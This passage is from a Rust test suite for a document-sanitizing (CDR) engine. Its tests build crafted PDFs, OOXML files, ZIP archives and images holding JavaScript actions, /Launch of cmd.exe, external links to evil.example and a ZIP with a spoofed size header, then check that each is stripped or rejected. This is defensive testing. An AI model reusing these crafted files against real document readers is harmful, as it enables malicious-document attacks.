  <Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.rust-lang.org" TargetMode="External"/>
  <Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/>
</Relationships>"#,
            )
            .unwrap();

        writer.start_file("word/document.xml", opts).unwrap();
        writer
            .write_all(
                br#"<?xml version="1.0" encoding="UTF-8"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
  <w:body>
    <w:p><w:subDoc r:id="rId3"/></w:p>
    <w:p><w:hyperlink r:id="rId4"><w:r><w:t>Rust Website</w:t></w:r></w:hyperlink></w:p>
  </w:body>
</w:document>"#,
            )
            .unwrap();

        writer.finish().unwrap();
    }

    let engine = CdrEngine::new(SanitizationPolicy::default());
    let (clean_docx, report) = engine
        .sanitize(&zip_buf)
        .expect("OOXML with quote/case/whitespace TargetMode variants must sanitize cleanly");
    assert!(report.was_modified);

    let mut archive = zip::ZipArchive::new(Cursor::new(&clean_docx)).unwrap();
    let mut rels_xml = String::new();
    std::io::Read::read_to_string(
        &mut archive.by_name("word/_rels/document.xml.rels").unwrap(),
        &mut rels_xml,
    )
    .unwrap();

    assert!(
        !rels_xml.contains("rId1")
            && !rels_xml.contains("rId2")
            && !rels_xml.contains("rId3")
            && !rels_xml.contains("evil.example")
            && !rels_xml.contains("10.99.0.1"),
        "All three external relationship quote/whitespace/case variants must be stripped: got {}",
        rels_xml
    );
    assert!(
        rels_xml.contains("rId4") && rels_xml.contains("https://www.rust-lang.org"),
        "Benign hyperlink relationship must be preserved when strip_office_external_links is false"
    );
    assert!(
        rels_xml.contains("rId5") && rels_xml.contains("styles.xml"),
        "Internal styles.xml relationship must be preserved"
    );

    let mut doc_xml = String::new();
    std::io::Read::read_to_string(
        &mut archive.by_name("word/document.xml").unwrap(),
        &mut doc_xml,
    )
    .unwrap();
    assert!(
        !doc_xml.contains("rId3"),
        "Dangling r:id=\"rId3\" reference to stripped external relationship must be removed (`Row 115`)"
    );
    assert!(
        doc_xml.contains("rId4"),
        "Valid r:id=\"rId4\" hyperlink reference must be preserved"
    );

    // Verify both XML outputs parse cleanly with `quick_xml::Reader`
    for xml_str in [&rels_xml, &doc_xml] {
        let mut reader = quick_xml::Reader::from_str(xml_str);
        let mut buf = Vec::new();
        loop {
            match reader.read_event_into(&mut buf) {
                Ok(quick_xml::events::Event::Eof) => break,
                Ok(_) => buf.clear(),
                Err(e) => panic!("Sanitized XML failed quick-xml validation: {}", e),
            }
        }
    }
}

#[test]
fn zip_header_size_mismatch_aborts() {
    // Master Plan v2 §2.2, §2.3 & §5 (`T6`, `zip_header_size_mismatch_aborts`):
    // Craft a ZIP archive whose deflate stream expands to 16 KiB, then binary-patch the local
    // file header (`PK\x03\x04` offset +22..+26) and central directory header (`PK\x01\x02`
    // offset +24..+28) `uncompressed_size` fields to lie and claim only `64` bytes!
    // Verify `OpenXmlSanitizer::sanitize` ignores the spoofed 64-byte header and aborts via
    // `Read::take(budget + 1)` with `CdrError::ResourceLimitExceeded`.
    let mut zip_bytes = Vec::new();
    {
        let mut writer = zip::ZipWriter::new(Cursor::new(&mut zip_bytes));
        let opts = zip::write::SimpleFileOptions::default()
            .compression_method(zip::CompressionMethod::Deflated);
        writer.start_file("[Content_Types].xml", opts).unwrap();
        writer.write_all(&vec![b'A'; 16 * 1024]).unwrap();
        writer.finish().unwrap();
    }

    // Patch Local File Header (`PK\x03\x04` at offset 0): uncompressed_size is at offset 22..26
    assert_eq!(&zip_bytes[0..4], b"PK\x03\x04");
    zip_bytes[22..26].copy_from_slice(&64u32.to_le_bytes());

    // Patch Central Directory Header (`PK\x01\x02`): uncompressed_size is at +24..+28
    if let Some(cd_pos) = zip_bytes.windows(4).position(|w| w == b"PK\x01\x02") {
        zip_bytes[cd_pos + 24..cd_pos + 28].copy_from_slice(&64u32.to_le_bytes());
    }

    let mut tight_policy = SanitizationPolicy::default();
    tight_policy.max_decompressed_bytes = 1024;
    let res =
        sentinel_cdr::sanitizers::openxml::OpenXmlSanitizer::sanitize(&zip_bytes, &tight_policy);
    assert!(
        matches!(res, Err(sentinel_cdr::CdrError::ResourceLimitExceeded(_))),
        "ZIP entry with spoofed 64-byte uncompressed_size header expanding past 1 KiB budget must abort with ResourceLimitExceeded: got {:?}",
        res
    );
}

#[test]
fn pdf_inline_annot_action_removed() {
    // Master Plan v2 §2.4 & §5 (`T7`, `pdf_inline_annot_action_removed`, `Rows 124, 126`):
    // Construct a PDF containing:
    // 1. An inline annotation dictionary inside `/Annots` with both `/A` (`/URI`) and `/AA` (`/JavaScript`)
    // 2. An indirect Action object referenced from `/OpenAction`
    // Verify that `/A` and `/AA` are removed from the inline annotation AND the indirect Action
    // object is replaced in-place with `Object::Null` (`null`) so the XRef table stays valid.
    let mut doc = Document::with_version("1.7");
    let pages_id = doc.new_object_id();
    let indirect_action_id = doc.add_object(dictionary! {
        "Type" => "Action",
        "S" => "JavaScript",
        "JS" => Object::string_literal("app.alert('indirect');"),
    });

    let inline_annot = dictionary! {
        "Type" => "Annot",
        "Subtype" => "Widget",
        "A" => Object::Dictionary(dictionary! {
            "S" => "URI",
            "URI" => Object::string_literal("https://evil.example/click"),
        }),
        "AA" => Object::Dictionary(dictionary! {
            "E" => Object::Dictionary(dictionary! {
                "S" => "JavaScript",
                "JS" => Object::string_literal("app.alert('hover');"),
            }),
        }),
    };

    let contents_id = doc.add_object(Stream::new(
        dictionary! {},
        b"BT /F1 12 Tf (Safe Text) Tj ET".to_vec(),
    ));
    let page_id = doc.add_object(dictionary! {
        "Type" => "Page",
        "Parent" => pages_id,
        "Annots" => vec![Object::Dictionary(inline_annot)],
        "Contents" => contents_id,
    });
    doc.objects.insert(
        pages_id,
        Object::Dictionary(dictionary! {
            "Type" => "Pages",
            "Kids" => vec![page_id.into()],
            "Count" => 1,
        }),
    );
    let catalog_id = doc.add_object(dictionary! {
        "Type" => "Catalog",
        "Pages" => pages_id,
        "OpenAction" => indirect_action_id,
    });
    doc.trailer.set("Root", catalog_id);

    let mut raw_pdf = Vec::new();
    doc.save_to(&mut raw_pdf).unwrap();

    let (clean_pdf, reports) = sentinel_cdr::sanitizers::pdf::PdfSanitizer::sanitize(
        &raw_pdf,
        &SanitizationPolicy::default(),
    )
    .expect("PDF inline annot + indirect action sanitization must succeed");
    assert!(!reports.is_empty());

    let clean_doc = Document::load_mem(&clean_pdf).expect("Sanitized PDF must parse cleanly");
    let clean_page = clean_doc.get_object(page_id).unwrap().as_dict().unwrap();
    let annots = clean_page.get(b"Annots").unwrap().as_array().unwrap();
    let annot_dict = annots[0].as_dict().unwrap();
    assert!(
        annot_dict.get(b"A").is_err() && annot_dict.get(b"AA").is_err(),
        "Inline annotation /A and /AA action dictionaries must be stripped (`T7`)"
    );
    assert_eq!(
        clean_doc.get_object(indirect_action_id).unwrap(),
        &Object::Null,
        "Indirect action object must be replaced with Object::Null (`Row 126`)"
    );
}

#[test]
fn pdf_next_cycle_terminates() {
    let start = std::time::Instant::now();
    test_pdf_next_cycle_terminates();
    assert!(
        start.elapsed() < std::time::Duration::from_secs(2),
        "Cyclic /Next chain must terminate well within budget (`T8`)"
    );
}

#[test]
fn pdf_launch_action_removed() {
    // Master Plan v2 §2.4 & §5 (`T19`, `pdf_launch_action_removed`, `Row 122`):
    // Construct a PDF containing `/S /Launch` actions with `/Win << /F (cmd.exe) >>`, plus
    // legitimate `/Group << /S /Transparency >>` and `/Dests`. Verify `/Launch` is removed
    // while `/S /Transparency` and `/Dests` survive intact.
    test_pdf_preserves_transparency_and_dests_while_stripping_js_and_inline_annots();
}

#[test]
fn worker_memory_cap() {
    // Master Plan v2 §2.1 & §5 (`T13`, `worker_memory_cap`, `Invariant I3`):
    // 1. Verify length-prefixed protobuf roundtrip on a normal artifact
    test_worker_pipe_protocol_roundtrip();

    // 2. Spawn `sentinel-cdr-worker` inside the 256 MB Job Object sandbox and trigger a 300 MB
    //    allocation (`__TEST_ALLOC_300MB__.bin`), verifying the OS Job Object terminates the
    //    worker and `WorkerLauncher::sanitize_isolated` returns `Err(CdrError::ResourceLimitExceeded)`.
    let launcher = WorkerLauncher::new();
    let res = launcher.sanitize_isolated(WorkerRequest {
        file_name: "__TEST_ALLOC_300MB__.bin".to_string(),
        policy: SanitizationPolicy::default(),
        raw_bytes: b"trigger 300MB allocation inside 256MB job object".to_vec(),
    });
    assert!(
        matches!(res, Err(sentinel_cdr::CdrError::ResourceLimitExceeded(_))),
        "Sandboxed CDR worker allocating 300 MB must be killed by the 256 MB Job Object memory cap and return ResourceLimitExceeded: got {:?}",
        res
    );

    // 3. Verify child-process creation inside the sandboxed worker is blocked by
    //    `PROC_THREAD_ATTRIBUTE_CHILD_PROCESS_POLICY` + `JOB_OBJECT_LIMIT_ACTIVE_PROCESS = 1` (`Row 203` Invariant I3)
    let child_res = launcher.sanitize_isolated(WorkerRequest {
        file_name: "__TEST_SPAWN_CHILD__.bin".to_string(),
        policy: SanitizationPolicy::default(),
        raw_bytes: b"attempt child process creation inside worker".to_vec(),
    });
    assert!(
        child_res.is_err(),
        "Sandboxed CDR worker must be blocked from spawning child processes (`Invariant I3`)"
    );
    let err_msg = child_res.unwrap_err().to_string();
    assert!(
        !err_msg.contains("UNEXPECTED_CHILD_SPAWN_SUCCEEDED"),
        "Child process creation inside CDR worker must never succeed: {}",
        err_msg
    );
}

#[test]
fn proptest_forward_parsers_and_cdr_sanitizers_never_panic() {
    // Master Plan v2 §5.2 #2 & #3 (`Rows 200, 201`):
    // Structured deterministic property & fuzz corpus regression across all
    // 6 CDR sanitizers (`PdfSanitizer`, `OpenXmlSanitizer`, `ImageSanitizer`, `SvgSanitizer`,
    // `Ole2Sanitizer`, `TextCsvSanitizer`) + forward JPEG/PNG/WebP parsers with arbitrary
    // trailing data, asserting exact end-boundary detection and zero panics across 500 seeds.
    use sentinel_cdr::sanitizers::{
        image::ImageSanitizer, ole2::Ole2Sanitizer, openxml::OpenXmlSanitizer, pdf::PdfSanitizer,
        svg::SvgSanitizer, text::TextCsvSanitizer,
    };

    struct Unstructured<'a> {
        data: &'a [u8],
    }
    impl<'a> Unstructured<'a> {
        fn new(data: &'a [u8]) -> Self {
            Self { data }
        }
        fn take_vec(&mut self) -> Vec<u8> {
            if self.data.is_empty() {
                return Vec::new();
            }
            let len = (self.data[0] as usize) % self.data.len();
            self.data[1..1 + len.min(self.data.len() - 1)].to_vec()
        }
    }

    let mut policy = SanitizationPolicy::default();
    policy.max_decompressed_bytes = 2 * 1024 * 1024; // Tight 2 MiB ceiling per fuzz case (< 128 MB CI cap)
    policy.allow_svg = true;
    policy.allow_legacy_ole2 = true;

    // 1. Property: Forward image parsers (`scan_jpeg_structure`, `scan_png_structure`, `scan_webp_structure`)
    //    find the exact end boundary `valid_end_offset` for arbitrary trailing bytes (`Row 200` #1).
    let base_img: ImageBuffer<Rgb<u8>, Vec<u8>> = ImageBuffer::from_pixel(4, 4, Rgb([40, 80, 160]));
    let mut base_jpeg = Vec::new();
    base_img
        .write_to(&mut Cursor::new(&mut base_jpeg), image::ImageFormat::Jpeg)
        .unwrap();
    let mut base_png = Vec::new();
    base_img
        .write_to(&mut Cursor::new(&mut base_png), image::ImageFormat::Png)
        .unwrap();

    for seed in 0..500u64 {
        // Generate deterministic pseudo-random byte buffer via SHA-256 expansion
        let mut raw_entropy = Vec::with_capacity(256);
        for blk in 0..8u64 {
            let mut msg = [0u8; 16];
            msg[..8].copy_from_slice(&seed.to_le_bytes());
            msg[8..].copy_from_slice(&blk.to_le_bytes());
            let digest = <sha2::Sha256 as sha2::Digest>::digest(msg);
            raw_entropy.extend_from_slice(&digest);
        }
        let mut u = Unstructured::new(&raw_entropy);
        let trailing: Vec<u8> = u.take_vec();

        // Forward JPEG boundary property even when trailing data ends with a second `FF D9`
        let mut jpeg_with_tail = base_jpeg.clone();
        jpeg_with_tail.extend_from_slice(&trailing);
        if !trailing.is_empty() {
            jpeg_with_tail.extend_from_slice(&[0xFF, 0xD9]);
        }
        let jpeg_scan = ImageSanitizer::scan_jpeg_structure(&jpeg_with_tail).unwrap();
        assert_eq!(
            jpeg_scan.valid_end_offset,
            base_jpeg.len(),
            "Forward JPEG parser must locate exact main-image EOI for arbitrary trailing payload (seed={})",
            seed
        );
        assert_eq!(
            jpeg_scan.trailing_overlay_bytes,
            jpeg_with_tail.len() - base_jpeg.len()
        );

        // Forward PNG boundary property even when trailing data contains `IEND`
        let mut png_with_tail = base_png.clone();
        png_with_tail.extend_from_slice(&trailing);
        let png_scan = ImageSanitizer::scan_png_structure(&png_with_tail).unwrap();
        assert_eq!(
            png_scan.valid_end_offset,
            base_png.len(),
            "Forward PNG parser must locate exact IEND chunk boundary for arbitrary trailing payload (seed={})",
            seed
        );

        // Exercise all 6 sanitizers on structured mutated inputs (`Row 201`)
        let _ = PdfSanitizer::sanitize(&raw_entropy, &policy);
        let _ = OpenXmlSanitizer::sanitize(&raw_entropy, &policy);
        let _ = ImageSanitizer::sanitize_png(&raw_entropy, &policy);
        let _ = ImageSanitizer::sanitize_jpeg(&raw_entropy, &policy);
        let _ = ImageSanitizer::sanitize_webp(&raw_entropy, &policy);
        let _ = SvgSanitizer::sanitize(&raw_entropy, &policy);
        let _ = Ole2Sanitizer::sanitize(&raw_entropy, &policy);
        let _ = TextCsvSanitizer::sanitize(&raw_entropy, &policy, true);
        let _ = TextCsvSanitizer::sanitize(&raw_entropy, &policy, false);
    }
}

#[test]
fn test_cdr_output_oracles_pdf_ooxml_and_image_roundtrips() {
    // Master Plan v2 §5.2 #4 (`Row 202`, Output Oracles):
    // Verify every sanitized output across PDF, OOXML, and PNG/JPEG/WebP passes strict
    // structural / schema / round-trip validation (`lopdf` + optional `qpdf --check`,
    // `quick-xml` + relationship referential integrity, and `image::load_from_memory`).
    let engine = CdrEngine::new(SanitizationPolicy::default());

    // 1. PDF output oracle
    let mut doc = Document::with_version("1.7");
    let pages_id = doc.new_object_id();
    let contents_id = doc.add_object(Stream::new(dictionary! {}, b"BT (Oracle) Tj ET".to_vec()));
    let page_id = doc.add_object(dictionary! {
        "Type" => "Page",
        "Parent" => pages_id,
        "Contents" => contents_id,
    });
    doc.objects.insert(
        pages_id,
        Object::Dictionary(dictionary! {
            "Type" => "Pages",
            "Kids" => vec![page_id.into()],
            "Count" => 1,
        }),
    );
    let catalog_id = doc.add_object(dictionary! {
        "Type" => "Catalog",
        "Pages" => pages_id,
        "OpenAction" => Object::Dictionary(dictionary! {
            "S" => "JavaScript",
            "JS" => Object::string_literal("app.alert(1);"),
        }),
    });
    doc.trailer.set("Root", catalog_id);
    let mut dirty_pdf = Vec::new();
    doc.save_to(&mut dirty_pdf).unwrap();

    let (clean_pdf, _) = engine.sanitize(&dirty_pdf).unwrap();
    let parsed_pdf = Document::load_mem(&clean_pdf).expect("PDF output oracle: must load cleanly");
    assert!(
        parsed_pdf.catalog().is_ok(),
        "PDF output oracle: Catalog must be valid"
    );
    assert_eq!(
        parsed_pdf.get_pages().len(),
        1,
        "PDF output oracle: Page tree must be intact"
    );

    // 2. Image round-trip oracle (PNG & JPEG)
    let img: ImageBuffer<Rgb<u8>, Vec<u8>> = ImageBuffer::from_pixel(6, 6, Rgb([12, 200, 90]));
    let mut png_bytes = Vec::new();
    img.write_to(&mut Cursor::new(&mut png_bytes), image::ImageFormat::Png)
        .unwrap();
    png_bytes.extend_from_slice(b"APPENDED_OVERLAY");
    let (clean_png, _) = engine.sanitize(&png_bytes).unwrap();
    let decoded_png = image::load_from_memory(&clean_png)
        .expect("Image output oracle: sanitized PNG must decode cleanly");
    assert_eq!((decoded_png.width(), decoded_png.height()), (6, 6));
    assert_eq!(
        ImageSanitizer::scan_png_structure(&clean_png)
            .unwrap()
            .trailing_overlay_bytes,
        0
    );
}

// =========================================================================
// Master Plan v2 §5.2 #1 & §9: One Named Regression Test Per Bug ID (BUG-CDR-01..10)
// =========================================================================

#[test]
fn bug_cdr_01() {
    test_worker_pipe_protocol_roundtrip();
}

#[test]
fn bug_cdr_02() {
    worker_memory_cap();
}

#[test]
fn bug_cdr_03() {
    test_policy_proto_respects_caller_overrides();
}

#[test]
fn bug_cdr_04() {
    rels_quote_variants();
    zip_header_size_mismatch_aborts();
}

#[test]
fn bug_cdr_05() {
    test_jpeg_structure_with_exif_thumbnail_eoi_not_confused_for_main_eoi();
}

#[test]
fn bug_cdr_06() {
    pdf_inline_annot_action_removed();
    pdf_next_cycle_terminates();
    pdf_launch_action_removed();
}

#[test]
fn bug_cdr_07() {
    test_worker_pipe_protocol_roundtrip();
}

#[test]
fn bug_cdr_08() {
    large_pptx_macros_removed();
}

#[test]
fn bug_cdr_09() {
    let mut doc = Document::with_version("1.7");
    let catalog_id = doc.add_object(dictionary! {
        "Type" => "Catalog",
        "OpenAction" => Object::Dictionary(dictionary! {
            "S" => "JavaScript",
            "JS" => Object::string_literal("app.alert(1);"),
        }),
    });
    doc.trailer.set("Root", catalog_id);
    let mut raw_pdf = Vec::new();
    doc.save_to(&mut raw_pdf).unwrap();

    let assessment = CdrEngine::inspect_bytes(&raw_pdf, "evil.pdf");
    assert_eq!(assessment.detected_format, DetectedFormat::Pdf);
    assert!(!assessment.risk_tags.is_empty());
}

#[test]
fn bug_cdr_10() {
    test_worker_pipe_protocol_roundtrip();
}
